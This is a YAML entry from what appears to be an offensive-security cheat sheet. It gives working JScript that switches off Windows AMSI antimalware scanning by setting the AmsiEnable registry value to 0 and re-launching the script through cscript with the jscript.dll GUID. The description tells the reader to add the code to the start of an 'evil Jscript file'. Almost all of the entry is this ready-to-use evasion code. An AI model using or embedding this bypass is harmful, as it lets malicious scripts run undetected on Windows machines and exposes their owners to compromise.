---
description: |
  In this Amsi Bypass it sets the HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable registry key to 0 and run the evil script. Add the code at the beginning of your evil Jscript file to turn off the AMSI.

  Command Reference:
  ```
  Registry key: HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable

  -e:  option indicates that the specified script file will be processed by jscript.dll (GUID)

  GUID: F414C262-6AC0-11CF-B6D1-00AA00BBBB58
  ```
command: |
  AMSI Bypass in JScript modifying the AmsiEnable registry key

code: |
  var sh = new ActiveXObject('WScript.Shell');
  var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"; 
  try{
      var AmsiEnable = sh.RegRead(key); 
      if(AmsiEnable!=0){
      throw new Error(1, '');
      }
  }catch(e){
      sh.RegWrite(key, 0, "REG_DWORD");
      sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName,0,1); 
      sh.RegWrite(key, 1, "REG_DWORD");
      WScript.Quit(1);
}

items:
  - Shell
services:
  - AV
OS:
  - Windows
attack_types:
  - Bypassing
references:
  - https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/av-edr-evasion/amsi-bypass#jscript
---